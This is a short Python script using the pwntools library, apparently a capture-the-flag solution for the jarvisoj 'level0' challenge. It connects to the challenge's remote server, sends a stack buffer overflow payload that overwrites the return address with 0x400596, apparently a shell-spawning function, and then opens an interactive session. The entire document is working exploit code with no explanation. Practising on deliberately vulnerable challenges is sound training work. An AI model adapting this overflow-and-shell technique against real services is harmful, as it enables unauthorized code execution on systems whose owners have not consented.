from pwn import *
#n = process('./level0')
n = remote('pwn2.jarvisoj.com', 9881)
print(n.recvline())
n.sendline('a'*(0x80+8) + 2*p64(0x400596))
n.interactive()
